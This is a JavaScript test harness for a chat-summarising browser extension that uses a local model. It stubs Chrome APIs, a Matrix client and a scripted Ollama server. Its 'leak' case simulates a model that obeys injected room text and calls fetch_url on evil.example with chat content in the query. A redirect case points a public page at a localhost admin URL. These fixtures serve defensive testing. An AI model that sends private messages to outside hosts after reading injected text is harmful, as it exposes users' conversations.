// Test stubs: chrome.* APIs, a fake Element client for the real extractRoom, and a fake Ollama.
(() => {
  const ME = "@wanda:example.org";
  const NAMES = { [ME]: "Wanda", "@ana:example.org": "Ana", "@bo:example.org": "Bo" };
  const now = Number(localStorage.getItem("harness-now") || Date.now());
  localStorage.setItem("harness-now", now);
  const raw = [];
  const EVERY = 15 * 60000;
  const N = Math.floor((35 * 86400000) / EVERY);
  for (let i = 0; i < N; i++) {
    const ts = now - (N - i) * EVERY;
    const sender = ["@ana:example.org", "@bo:example.org", ME][i % 3];
    let body = `message ${i} about the build pipeline and the release checklist for this sprint`;
    if (i % 40 === 7) body = `wanda, can you review patch ${i}?`;
    if (i === N - 5) body = `the release notes are at https://pages.example/notes.`;
    raw.push({ event_id: `$e${i}`, sender, origin_server_ts: ts, content: { msgtype: "m.text", body } });
    if (i % 5 === 0) raw.push({ event_id: `$r${i}`, type: "m.reaction", sender, origin_server_ts: ts + 1, content: {} });
  }
  const readId = `$e${N - 12}`; // 3 hours ago
  class Ev {
    constructor(o) { this.o = o; }
    getType() { return this.o.type ?? "m.room.message"; }
    isRedacted() { return false; }
    isDecryptionFailure() { return false; }
    getContent() { return this.o.content; }
    getTs() { return this.o.origin_server_ts; }
    getId() { return this.o.event_id; }
    getSender() { return this.o.sender; }
    get sender() { return { name: NAMES[this.o.sender] }; }
  }
  const encRaw = [];
  for (let i = 0; i < 4000; i++) {
    const body = i === 3990 || i === 20 ? `kubernetes upgrade ${i}` : `secret chat ${i}`;
    encRaw.push({ event_id: `$k${i}`, sender: ["@ana:example.org", ME][i % 2], origin_server_ts: now - (4000 - i) * EVERY, content: { msgtype: "m.text", body } });
  }
  const encRoom = {
    roomId: "!enc:example.org", name: "Secret room",
    currentState: { getStateEvents: (t) => (t === "m.room.encryption" ? {} : null) },
    getCanonicalAlias: () => null, getAltAliases: () => [],
    getJoinedMemberCount: () => 2, getMember: (id) => ({ name: NAMES[id] }),
    getLiveTimeline: () => ({ getEvents: () => [] }), findEventById: () => undefined,
    getAccountData: () => undefined, getEventReadUpTo: () => null,
  };
  const room = {
    roomId: "!room:example.org", name: "Harness room",
    currentState: { getStateEvents: () => null },
    getCanonicalAlias: () => null, getAltAliases: () => [],
    getJoinedMemberCount: () => 3, getMember: (id) => ({ name: NAMES[id] }),
    getLiveTimeline: () => ({ getEvents: () => raw.slice(-20).map((r) => new Ev(r)) }),
    findEventById: () => undefined,
    getAccountData: (t) => (t === "m.fully_read" ? { getContent: () => ({ event_id: readId }) } : undefined),
    getEventReadUpTo: () => null,
  };
  window.__pages = 0;
  const rawOf = (id) => (id === encRoom.roomId ? encRaw : raw);
  window.__searches = 0;
  const client = {
    getRoom: (id) => [room, encRoom].find((r) => r.roomId === id) ?? null, getRooms: () => [room, encRoom],
    search: async ({ body, next_batch }) => {
      window.__searches++;
      const cat = body.search_categories.room_events;
      const words = cat.search_term.toLowerCase().split(/\s+/);
      const hits = rawOf(cat.filter.rooms[0]).filter((e) => !e.type && words.every((w) => e.content.body.toLowerCase().includes(w))).reverse();
      const from = Number(next_batch ?? 0);
      const results = hits.slice(from, from + cat.filter.limit).map((result) => ({ rank: 1, result }));
      return { search_categories: { room_events: { count: hits.length, results, next_batch: from + cat.filter.limit < hits.length ? String(from + cat.filter.limit) : undefined } } };
    },
    getUserId: () => ME, getUser: (id) => ({ displayName: NAMES[id] }),
    getEventMapper: () => (r) => new Ev(r), decryptEventIfNeeded: async () => {},
    fetchRoomEvent: async (_r, id) => raw.find((r) => r.event_id === id),
    createMessagesRequest: async (roomId, from, limit) => {
      window.__pages++;
      const src = rawOf(roomId);
      const end = from === null ? src.length : Number(from);
      const start = Math.max(0, end - limit);
      return { chunk: src.slice(start, end).reverse(), end: start > 0 ? String(start) : undefined };
    },
  };
  window.mxMatrixClientPeg = { get: () => client };
  const startRoom = sessionStorage.getItem("harness-room") || "!room:example.org";
  history.replaceState(null, "", location.pathname + location.search + "#/room/" + startRoom);

  const store = JSON.parse(localStorage.getItem("harness-store") || "{}");
  const persist = () => localStorage.setItem("harness-store", JSON.stringify(store));
  const pick = (keys) => {
    if (keys == null) return { ...store };
    const ks = typeof keys === "string" ? [keys] : Array.isArray(keys) ? keys : Object.keys(keys);
    return Object.fromEntries(ks.filter((k) => k in store).map((k) => [k, structuredClone(store[k])]));
  };
  const sess = JSON.parse(sessionStorage.getItem("harness-session") || "{}");
  const sessPersist = () => sessionStorage.setItem("harness-session", JSON.stringify(sess));
  const sessPick = (keys) => {
    if (keys == null) return structuredClone(sess);
    const ks = typeof keys === "string" ? [keys] : Array.isArray(keys) ? keys : Object.keys(keys);
    return Object.fromEntries(ks.filter((k) => k in sess).map((k) => [k, structuredClone(sess[k])]));
  };
  const tab = { id: 1, url: "https://element.example/#/room/" + startRoom };
  const updated = [];
  // notify: false simulates the tab moving before the panel hears about it
  window.__switchRoom = (id, notify = true) => {
    history.replaceState(null, "", location.pathname + location.search + "#/room/" + id);
    tab.url = "https://element.example/#/room/" + id;
    sessionStorage.setItem("harness-room", id);
    if (notify) for (const f of updated) f(1, { url: tab.url });
  };
  // any tab's update, e.g. __tabUpdated(2, { status: "complete" }) for a tab the panel does not read
  window.__tabUpdated = (id, change) => { for (const f of updated) f(id, change); };
  // new events in the unencrypted room, newer than everything loaded so far
  let posted = 0;
  window.__post = (body, sender = "@ana:example.org") => {
    const event_id = `$p${posted++}`;
    raw.push({ event_id, sender, origin_server_ts: Date.now(), content: { msgtype: "m.text", body } });
    return event_id;
  };
  window.__redact = (id) => raw.push({ event_id: `$x${posted++}`, type: "m.room.redaction", sender: ME, origin_server_ts: Date.now(), content: { redacts: id } });
  window.chrome = {
    storage: { session: {
      get: async (k) => sessPick(k),
      set: async (o) => { Object.assign(sess, structuredClone(o)); sessPersist(); },
      remove: async (k) => { for (const x of [].concat(k)) delete sess[x]; sessPersist(); },
    }, local: {
      get: async (k) => pick(k),
      set: async (o) => { Object.assign(store, structuredClone(o)); persist(); },
      remove: async (k) => { for (const x of [].concat(k)) delete store[x]; persist(); },
    } },
    tabs: {
      query: async () => [tab], get: async () => tab, update: async () => tab,
      onActivated: { addListener() {} }, onUpdated: { addListener: (f) => updated.push(f) },
    },
    permissions: { request: async () => true },
    scripting: {
      executeScript: async ({ func, args }) => [{ result: JSON.parse(JSON.stringify(await func(...args))) }],
    },
  };

  window.__chats = [];
  window.__clip = null;
  Object.defineProperty(navigator, "clipboard", { value: { writeText: async (t) => { window.__clip = t; } } });
  const realFetch = window.fetch.bind(window);
  const json = (o) => new Response(JSON.stringify(o), { headers: { "content-type": "application/json" } });
  window.__fetched = [];
  const html = (s) => new Response(`<html><body>${s}</body></html>`, { headers: { "content-type": "text/html" } });
  const toolCall = (name, args) => new Response(new ReadableStream({ start(c) {
    const call = { function: { name, arguments: args } };
    c.enqueue(new TextEncoder().encode(JSON.stringify({ message: { content: "", tool_calls: [call] } }) + "\n" + JSON.stringify({ done: true }) + "\n"));
    c.close();
  } }));
  window.fetch = async (url, init) => {
    const u = String(url);
    if (/^https:\/\/(pages|evil)\.example\//.test(u)) {
      window.__fetched.push(u);
      const page = html(`<p>Page text of ${u}</p>`);
      // a public page that redirects into the local network
      if (u.endsWith("/redirect-local")) Object.defineProperty(page, "url", { value: "http://127.0.0.1/admin" });
      return page;
    }
    if (u.startsWith("https://search.brave.com/")) {
      return html('<div class="snippet" data-type="web"><a href="https://pages.example/result"><div class="title">Result</div></a><div class="content">a snippet</div></div>');
    }
    if (u.endsWith("/api/tags")) return json({ models: [{ name: "gemma4:26b-a4b-it-qat" }] });
    if (u.endsWith("/api/show")) return json({ model_info: { "gemma4.context_length": 131072 } });
    if (u.endsWith("/api/chat")) {
      const body = JSON.parse(init.body);
      window.__chats.push(body);
      const sys = body.messages[0].content;
      const refsIn = [...sys.matchAll(/^\[#(\d+)\]/gm)].map((m) => Number(m[1]));
      const lastMsg = body.messages.at(-1);
      const last = lastMsg.content;
      const enc0 = new TextEncoder();
      // "leak" acts like a model obeying injected room text: it builds a URL out of the room's messages
      if (lastMsg.role === "user" && last === "leak") {
        return toolCall("fetch_url", { url: `https://evil.example/?d=${encodeURIComponent(sys.match(/^\[#\d+\].*$/m)?.[0] ?? "")}` });
      }
      if (lastMsg.role === "user" && last === "open the room link") {
        return toolCall("fetch_url", { url: sys.match(/https:\/\/pages\.example\/\w+/)?.[0] ?? "" });
      }
      if (lastMsg.role === "user" && last.startsWith("fetch ")) return toolCall("fetch_url", { url: last.slice(6) });
      if (lastMsg.role === "user" && last.startsWith("web ")) return toolCall("web_search", { query: last.slice(4) });
      if (lastMsg.tool_name === "web_search" && !last.startsWith("Error")) {
        return toolCall("fetch_url", { url: last.match(/https:\S+/)[0] });
      }
      if (lastMsg.role === "user" && last === "markdown") {
        const md = "### Decisions\n\n*   Ship on *Friday* [#1]\n    *   after the **freeze**\n*   Use `make check`\n\n1. first\n2. second\n\n---\nSee https://example.org/x and <b>not bold</b>\n```\n* not a list\n```";
        return new Response(JSON.stringify({ message: { content: md } }) + "\n" + JSON.stringify({ done: true }) + "\n");
      }
      if (lastMsg.role === "user" && last.startsWith("search ")) {
        const call = { function: { name: "search_room", arguments: { query: last.slice(7) } } };
        return new Response(new ReadableStream({ start(c) {
          c.enqueue(enc0.encode(JSON.stringify({ message: { content: "", tool_calls: [call] } }) + "\n" + JSON.stringify({ done: true }) + "\n"));
          c.close();
        } }));
      }
      if (lastMsg.role === "user" && last.startsWith("slow")) {
        return new Response(new ReadableStream({ async start(c) {
          for (const w of ["slow ", "answer ", "in ", "parts"]) {
            c.enqueue(enc0.encode(JSON.stringify({ message: { content: w } }) + "\n"));
            await new Promise((r) => setTimeout(r, 700));
          }
          c.close();
        } }));
      }
      if (lastMsg.role === "tool") {
        const hit = last.match(/^\[#(\d+)\]/m);
        const text = `Search said: ${last.split("\n")[0]}${hit ? ` First hit [#${hit[1]}]` : ""}`;
        return new Response(new ReadableStream({ start(c) {
          c.enqueue(enc0.encode(JSON.stringify({ message: { content: text } }) + "\n"));
          c.close();
        } }));
      }
      const text = /^These (\d+ )?messages \(/.test(last)
        ? `- part with ${refsIn.length} messages, first [#${refsIn[0]}], last [#${refsIn.at(-1)}]`
        : `Answer from ${refsIn.length} message lines and ${(sys.match(/^Part \d+/gm) || []).length} parts; see [#${refsIn[0] ?? 1}]\n` +
          (sys.match(/^Part \d+ \(.*\):\n- part with .*$/gm) || []).join("\n");
      const enc = new TextEncoder();
      // "overflow" reports what Ollama does with an oversized request: it reads only the end
      const sent = body.messages.reduce((n, m) => n + (m.content?.length ?? 0), 0);
      const done = { done: true, prompt_eval_count: last === "overflow" ? 2051 : Math.round(sent / 2.6) };
      const stream = new ReadableStream({
        start(c) {
          c.enqueue(enc.encode(JSON.stringify({ message: { content: text.slice(0, 10) } }) + "\n"));
          c.enqueue(enc.encode(JSON.stringify({ message: { content: text.slice(10) } }) + "\n" + JSON.stringify(done) + "\n"));
          c.close();
        },
      });
      return new Response(stream);
    }
    return realFetch(url, init);
  };
})();
